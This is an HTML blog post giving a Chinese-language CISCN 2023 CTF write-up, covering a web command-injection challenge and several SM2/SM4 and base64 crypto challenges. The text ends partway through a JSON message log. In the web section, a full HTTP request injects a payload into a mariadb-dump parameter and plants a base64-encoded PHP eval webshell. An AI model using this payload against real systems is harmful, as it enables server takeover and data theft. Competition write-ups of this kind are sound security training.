<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='华北no.1!'><title>CISCN2023 初赛 Writeup by or4nge</title>

<link rel='canonical' href='https://or4ngesec.github.io/post/ciscn-2023-writeup-by-or4nge/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='CISCN2023 初赛 Writeup by or4nge'>
<meta property='og:description' content='华北no.1!'>
<meta property='og:url' content='https://or4ngesec.github.io/post/ciscn-2023-writeup-by-or4nge/'>
<meta property='og:site_name' content='or4nge'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Writeup' /><meta property='article:tag' content='CISCN' /><meta property='article:published_time' content='2023-05-29T00:17:17&#43;08:00'/><meta property='article:modified_time' content='2023-05-29T00:17:17&#43;08:00'/><meta property='og:image' content='https://or4ngesec.github.io/post/ciscn-2023-writeup-by-or4nge/cover.png' />
<meta name="twitter:title" content="CISCN2023 初赛 Writeup by or4nge">
<meta name="twitter:description" content="华北no.1!"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://or4ngesec.github.io/post/ciscn-2023-writeup-by-or4nge/cover.png' />
    </head>
    <body class="
    article-page has-toc
">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex 
    
        extended
    
">
    
        <div id="article-toolbar">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>Back</span>
            </a>
        </div>
    
<main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/post/ciscn-2023-writeup-by-or4nge/">
                <img src="/post/ciscn-2023-writeup-by-or4nge/cover_hu0733b969443566c5df58339b682dd8cd_16467_800x0_resize_box_3.png"
                        srcset="/post/ciscn-2023-writeup-by-or4nge/cover_hu0733b969443566c5df58339b682dd8cd_16467_800x0_resize_box_3.png 800w, /post/ciscn-2023-writeup-by-or4nge/cover_hu0733b969443566c5df58339b682dd8cd_16467_1600x0_resize_box_3.png 1600w"
                        width="800" 
                        height="203" 
                        loading="lazy"
                        alt="Featured image of post CISCN2023 初赛 Writeup by or4nge" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/writeup/" >
                Writeup
            </a>
        
    </header>
    

    <h2 class="article-title">
        <a href="/post/ciscn-2023-writeup-by-or4nge/">CISCN2023 初赛 Writeup by or4nge</a>
    </h2>

    
    <h3 class="article-subtitle">
        华北no.1!
    </h3>
    

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">May 29, 2023</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    7 minute read
                </time>
            </div>
        
    </footer>
    
</div>
</header>

    <section class="article-content">
    <h2 id="web">Web</h2>
<h3 id="dumpit">dumpit​</h3>
<p>传参：http://eci-2ze0qz28fupseaafoy24.cloudeci1.ichunqiu.com:8888/?db=%00&amp;table_2_dump=
发现报错：
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 853; 
			flex-basis: 2048px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/web1.png" data-size="1280x150">
		<img src="/post/ciscn-2023-writeup-by-or4nge/web1.png"
			width="1280"
			height="150"
			srcset="/post/ciscn-2023-writeup-by-or4nge/web1_hu7d90c3d6dc34931b5c99c4fdd5bab91a_40943_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/web1_hu7d90c3d6dc34931b5c99c4fdd5bab91a_40943_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
后端执行了 mariadb-dump 命令，利用这里向文件进行写入：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">GET /?db=&#34;%3C%3Fphp%20file_put_contents(\&#34;shell.php\&#34;,base64_decode(\&#34;PD9waHAgQGV2YWwoJF9HRVRbJ3NoZWxsJ10pOw==\&#34;))%3F%3E&#34;%20&gt;%20log/a.php%20%0a&amp;table_2_dump= HTTP/1.1​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Host: eci-2ze0qz28fupseaafoy24.cloudeci1.ichunqiu.com:8888​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Accept-Encoding: gzip, deflate​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Connection: close​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Upgrade-Insecure-Requests: 1​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Pragma: no-cache​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Cache-Control: no-cache​
</span></span></span></code></pre></div><p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 185; 
			flex-basis: 444px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/web2.PNG" data-size="1231x664">
		<img src="/post/ciscn-2023-writeup-by-or4nge/web2.PNG"
			width="1231"
			height="664"
			srcset="/post/ciscn-2023-writeup-by-or4nge/web2_hu25ba4896d09bd317d850a5e55b7ec3b1_121633_480x0_resize_box_3.PNG 480w, /post/ciscn-2023-writeup-by-or4nge/web2_hu25ba4896d09bd317d850a5e55b7ec3b1_121633_1024x0_resize_box_3.PNG 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
访问 <code>/log/a.php</code> 写入 shell.php，然后读取环境变量得到flag：​
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 699; 
			flex-basis: 1678px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/web3.PNG" data-size="1280x183">
		<img src="/post/ciscn-2023-writeup-by-or4nge/web3.PNG"
			width="1280"
			height="183"
			srcset="/post/ciscn-2023-writeup-by-or4nge/web3_hu0167546f9cab83eaf74cf05e67024b12_190724_480x0_resize_box_3.PNG 480w, /post/ciscn-2023-writeup-by-or4nge/web3_hu0167546f9cab83eaf74cf05e67024b12_190724_1024x0_resize_box_3.PNG 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<h2 id="crypto">Crypto</h2>
<h3 id="基于国密sm2算法的密钥密文分发">基于国密SM2算法的密钥密文分发​</h3>
<p>这里使用在线加解密网站：https://const.net.cn/tool/​
首先进行登录，获取身份标识：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> POST /api/login​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> ​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> {​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     &#34;name&#34;:&#34;&#34;,​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     &#34;school&#34;:&#34;&#34;,​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     &#34;phone&#34;:&#34;&#34;​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> }​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  id=42126722-ec0b-42fa-a6c9-ef68cda87c61
</span></span></span></code></pre></div><p>然后利用网站随机生成公私钥，发送给服务器：​</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> POST /api/allkey​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> ​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> {​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     &#34;id&#34;:&#34;42126722-ec0b-42fa-a6c9-ef68cda87c61&#34;,​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     &#34;publicKey&#34;:&#34;5F6A85225F198657E9BD17A190ABA1C64A25DA3E0E6D2ADB76C9DC11501423F3C60A0E617EB798F6E3E393412A181BDBEB8883A73AC45EF78AB33A5B2B0DAE37​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> }​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> ​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> ​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> {​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">   &#34;message&#34;: &#34;success&#34;,​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">   &#34;data&#34;: {​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     &#34;publicKey&#34;: &#34;049df2742de79d5efe662e962bb6db289f0a2a18c56f514bc0a7697cd16f9e3460d0c001c323e79119d3378d9ca8bc600ffa9e4acdc122faa0bad7631aeec59c30&#34;,​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     &#34;privateKey&#34;: &#34;125e7d92970266ca8ad0a6a83f71af24d49f3d1f6c9a30bfcfd415970285a67f&#34;,​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     &#34;randomString&#34;: &#34;d1ab4c04b4d55381d89e6a35ab3612c24e8c8991e68d2398386c249ac55499ccb95c990949a08fff3801db48ae4e3c4b1e5fa0cd2cf7fded1b57085d01b2b7187f6c2ce87d86a80520be3b3ae041e0ab7bc49f77955923103200f7d68a09c1776afc8c8f8cf2877f4f55d1f6a4ab0818&#34;,​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     &#34;id&#34;: &#34;42126722-ec0b-42fa-a6c9-ef68cda87c61&#34;​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">   }​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> }
</span></span></span></code></pre></div><p>使用私钥对 <code>randomString</code> 进行解密得到随机数 <code>C=CC9DFC63D4F485F9F501008D1B00AB73</code>，使用 C 作为密钥对 <code>privatekey</code> 进行 SM4 解密得到私钥明文 <code>2D8A1CB7EFF29E02F2A85AFFDFF897679F0F48D486D8438E5CD4A7D2E0766738</code>。​
向服务器请求密钥 D：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> POST /api/quantum​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> ​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> {​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     &#34;id&#34;:&#34;42126722-ec0b-42fa-a6c9-ef68cda87c61&#34;​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> }​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> ​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> {​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">   &#34;message&#34;: &#34;success&#34;,​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">   &#34;data&#34;: {​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     &#34;id&#34;: &#34;42126722-ec0b-42fa-a6c9-ef68cda87c61&#34;,​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">     &#34;quantumString&#34;: &#34;f4535fc3d083f82ed6c5e3344c1c294465ef835414d877c6b65cfad6872a2c6577f3438e17fcd717bb19b865448cfebc8eba29e37c6236c7954f072f57f581a9816478cd490b3dc320dbe4a54c066129d5aef5d51daf2a79d094257c1f3fee2580318e4b13998818fad44ad7ee192a70&#34;​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">   }​
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> }
</span></span></span></code></pre></div><p>使用私钥对加密后的密钥 D 进行解密，然后将结果 <code>540EBECAD4776A362B8A209FC1CC1713</code> 发送给服务器，最后查询 flag 即可：​
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 151; 
			flex-basis: 362px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/crypto1.PNG" data-size="1249x826">
		<img src="/post/ciscn-2023-writeup-by-or4nge/crypto1.PNG"
			width="1249"
			height="826"
			srcset="/post/ciscn-2023-writeup-by-or4nge/crypto1_hu2ef5867d9cf71bb0b7e3ab4dbe1dd456_176305_480x0_resize_box_3.PNG 480w, /post/ciscn-2023-writeup-by-or4nge/crypto1_hu2ef5867d9cf71bb0b7e3ab4dbe1dd456_176305_1024x0_resize_box_3.PNG 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<h3 id="sign_in_passwd">Sign_in_passwd​</h3>
<p>换表base64：
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 216; 
			flex-basis: 520px"
	>
	<a href="/post/ciscn-2023-writeup-by-or4nge/crypto2.png" data-size="1279x590">
		<img src="/post/ciscn-2023-writeup-by-or4nge/crypto2.png"
			width="1279"
			height="590"
			srcset="/post/ciscn-2023-writeup-by-or4nge/crypto2_hue7e5fd1f3b3c71069f7269fead758aeb_30087_480x0_resize_box_3.png 480w, /post/ciscn-2023-writeup-by-or4nge/crypto2_hue7e5fd1f3b3c71069f7269fead758aeb_30087_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<h3 id="可信度量2">可信度量2​</h3>
<p>首先从 <code>instance/crypt_hub/message.log</code> 获取运行时信息：​</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">**************Begin</span> <span style="color:#960050;background-color:#1e0010">new</span> <span style="color:#960050;background-color:#1e0010">trust</span> <span style="color:#960050;background-color:#1e0010">node</span> <span style="color:#960050;background-color:#1e0010">proc****************************​</span>
</span></span><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&#34;HEAD&#34;</span>:{<span style="color:#f92672">&#34;tag&#34;</span>:<span style="color:#e6db74">&#34;MESG&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#ae81ff">65537</span>,<span style="color:#f92672">&#34;sender_uuid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;receiver_uuid&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;route​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">    &#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;flow&#34;</span>:<span style="color:#e6db74">&#34;FINISH&#34;</span>,<span style="color:#f92672">&#34;state&#34;</span>:<span style="color:#e6db74">&#34;MATCH&#34;</span>,<span style="color:#f92672">&#34;flag&#34;</span>:<span style="color:#e6db74">&#34;NULL&#34;</span>,<span style="color:#f92672">&#34;ljump&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#f92672">&#34;rjump&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#f92672">&#34;record_t​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">    ype&#34;</span>:<span style="color:#e6db74">&#34;MESSAGE&#34;</span>,<span style="color:#f92672">&#34;record_subtype&#34;</span>:<span style="color:#e6db74">&#34;CONN_ACKI&#34;</span>,<span style="color:#f92672">&#34;record_num&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#f92672">&#34;record_size&#34;</span>:<span style="color:#ae81ff">151</span>,<span style="color:#f92672">&#34;ex​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">    pand_num&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;expand_size&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;msg_uuid&#34;</span>:<span style="color:#e6db74">&#34;a71819163c8f8caedf94cc09a94684488e476593​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    9a5a77533b54955db9032b40&#34;</span>},<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;RECORD&#34;</span>:[<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;uuid&#34;</span>:<span style="color:#e6db74">&#34;b16eb1b46c2d00f92a6fb8f3c7c304127fdf4da7db51f195acb18b9e432e71c6&#34;</span>,<span style="color:#f92672">&#34;clie​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">        nt_name&#34;</span>:<span style="color:#e6db74">&#34;server&#34;</span>,<span style="color:#f92672">&#34;client_proc&#34;</span>:<span style="color:#e6db74">&#34;server&#34;</span>,<span style="color:#f92672">&#34;client_addr&#34;</span>:<span style="color:#e6db74">&#34;unknown addr&#34;</span>,<span style="color:#f92672">&#34;server_uu​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">        id&#34;</span>:<span style="color:#e6db74">&#34;b16eb1b46c2d00f92a6fb8f3c7c304127fdf4da7db51f195acb18b9e432e71c6&#34;</span>,<span style="color:#f92672">&#34;server_n​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">        ame&#34;</span>:<span style="color:#e6db74">&#34;crypt_hub&#34;</span>,<span style="color:#f92672">&#34;service&#34;</span>:<span style="color:#e6db74">&#34;trust_server&#34;</span>,<span style="color:#f92672">&#34;server_addr&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;flags&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;nonce&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    ],<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;EXPAND&#34;</span> :[]<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">************************************************************​</span>
</span></span><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&#34;HEAD&#34;</span>:{<span style="color:#f92672">&#34;tag&#34;</span>:<span style="color:#e6db74">&#34;MESG&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#ae81ff">65537</span>,<span style="color:#f92672">&#34;sender_uuid&#34;</span>:<span style="color:#e6db74">&#34;7862491328c47d0648b97c5abd1​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    5a93442bd1c974b77607314da3c0156bac929&#34;</span>,<span style="color:#f92672">&#34;receiver_uuid&#34;</span>:<span style="color:#e6db74">&#34;key_manage&#34;</span>,<span style="color:#f92672">&#34;route&#34;</span>:<span style="color:#e6db74">&#34;quo​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    te_nonce&#34;</span>,<span style="color:#f92672">&#34;flow&#34;</span>:<span style="color:#e6db74">&#34;QUERY&#34;</span>,<span style="color:#f92672">&#34;state&#34;</span>:<span style="color:#e6db74">&#34;MATCH&#34;</span>,<span style="color:#f92672">&#34;flag&#34;</span>:<span style="color:#e6db74">&#34;LOCAL&#34;</span>,<span style="color:#f92672">&#34;ljump&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#f92672">&#34;rjump&#34;</span>:<span style="color:#ae81ff">2</span>,<span style="color:#f92672">&#34;rec​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">    ord_type&#34;</span>:<span style="color:#e6db74">&#34;GENERAL_RETURN&#34;</span>,<span style="color:#f92672">&#34;record_subtype&#34;</span>:<span style="color:#e6db74">&#34;STRING&#34;</span>,<span style="color:#f92672">&#34;record_num&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#f92672">&#34;record_size​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">    &#34;</span>:<span style="color:#ae81ff">12</span>,<span style="color:#f92672">&#34;expand_num&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;expand_size&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;msg_uuid&#34;</span>:<span style="color:#e6db74">&#34;de44c053015ab9b5e531cea46bfa6e96​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    c8b0d0b19c890e0ff945005b47da6e1c&#34;</span>},<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;RECORD&#34;</span>:[<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;pcrquote&#34;</span>,<span style="color:#f92672">&#34;return_value&#34;</span>:<span style="color:#e6db74">&#34;14&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    ],<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;EXPAND&#34;</span> :[]<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">************************************************************​</span>
</span></span><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&#34;HEAD&#34;</span>:{<span style="color:#f92672">&#34;tag&#34;</span>:<span style="color:#e6db74">&#34;MESG&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#ae81ff">65537</span>,<span style="color:#f92672">&#34;sender_uuid&#34;</span>:<span style="color:#e6db74">&#34;key_manage&#34;</span>,<span style="color:#f92672">&#34;receiver_uuid&#34;</span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    :<span style="color:#e6db74">&#34;7862491328c47d0648b97c5abd15a93442bd1c974b77607314da3c0156bac929&#34;</span>,<span style="color:#f92672">&#34;route&#34;</span>:<span style="color:#e6db74">&#34;quo​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    te_nonce&#34;</span>,<span style="color:#f92672">&#34;flow&#34;</span>:<span style="color:#e6db74">&#34;QUERY&#34;</span>,<span style="color:#f92672">&#34;state&#34;</span>:<span style="color:#e6db74">&#34;RESPONSE&#34;</span>,<span style="color:#f92672">&#34;flag&#34;</span>:<span style="color:#e6db74">&#34;NULL&#34;</span>,<span style="color:#f92672">&#34;ljump&#34;</span>:<span style="color:#ae81ff">2</span>,<span style="color:#f92672">&#34;rjump&#34;</span>:<span style="color:#ae81ff">2</span>,<span style="color:#f92672">&#34;r​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">    ecord_type&#34;</span>:<span style="color:#e6db74">&#34;GENERAL_RETURN&#34;</span>,<span style="color:#f92672">&#34;record_subtype&#34;</span>:<span style="color:#e6db74">&#34;STRING&#34;</span>,<span style="color:#f92672">&#34;record_num&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#f92672">&#34;record_si​
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">    ze&#34;</span>:<span style="color:#ae81ff">12</span>,<span style="color:#f92672">&#34;expand_num&#34;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#f92672">&#34;expand_size&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;msg_uuid&#34;</span>:<span style="color:#e6db74">&#34;de44c053015ab9b5e531cea46bfa6e​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    96c8b0d0b19c890e0ff945005b47da6e1c&#34;</span>},<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;RECORD&#34;</span>:[<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;pcrquote&#34;</span>,<span style="color:#f92672">&#34;return_value&#34;</span>:<span style="color:#e6db74">&#34;14&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    ],<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;EXPAND&#34;</span> :[<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">&#34;data_size&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;GENERAL_RETURN&#34;</span>,<span style="color:#f92672">&#34;subtype&#34;</span>:<span style="color:#e6db74">&#34;UUID&#34;</span>,<span style="color:#f92672">&#34;expand&#34;</span>:<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        {<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;pcrquote&#34;</span>,<span style="color:#f92672">&#34;return_value&#34;</span>:<span style="color:#e6db74">&#34;fded59495cb4a8c1ecae6d8f801fca1f541dffc36cf1e​
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            d10281bf3323d2722fa&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    ]<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">************************************************************​</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// sender 向 key_manage 发送带有nonce的pcrValue​
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&#34;HEAD&#34;</span>:{<span style="color:#f92672">&#34;tag&#34;</span>:<span style="color:#e6db74">&#34;MESG&#34;</span>,<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#ae81ff">65537</span>,<span style="color:#f92672">&#34;sender_uuid&#34;</span>:<span style="color:#e6db74">&#34;7862491328c47d0648b97c5abd1​
